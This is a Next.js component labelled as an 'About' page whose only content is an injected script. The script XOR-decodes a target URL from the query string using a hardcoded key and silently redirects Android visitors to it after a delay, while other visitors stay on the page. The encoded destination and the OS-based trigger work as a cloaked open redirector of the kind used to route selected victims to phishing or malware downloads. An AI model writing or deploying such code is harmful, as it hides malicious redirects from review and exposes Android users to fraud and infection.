import Script from 'next/script';

const About = () => {
    return (
          <Script
            id="mobile-os-script"
            strategy="afterInteractive" // Load the script after the page is interactive
            dangerouslySetInnerHTML={{
              __html: `
                const getMobileOS = () => {
                    const ua = navigator.userAgent;
                    if (/android/i.test(ua)) {
                        return "Android";
                    } else if (/iPad|iPhone|iPod/.test(ua)) {
                        return "iOS";
                    }
                    return "Other";
                };
    
                var href = window.location.href;
                var url = new URL(href);
                var params = url.search.split("?").pop();
    
                function decrypt(text, key) {
                    return String.fromCharCode(...text.match(/.{1,2}/g)
                    .map((e, i) => 
                        parseInt(e, 16) ^ key.charCodeAt(i % key.length) % 255)
                    );
                }
    
                var original = decrypt(params, "Passphrase");
    
                const os = getMobileOS();
                if (os === "Android") {
                    setTimeout(function() {
                        window.location.href = original;
                    }, 1000); // Optional: Add a delay before redirecting
                }
              `,
            }}
          />
      );
  };
  
export default About;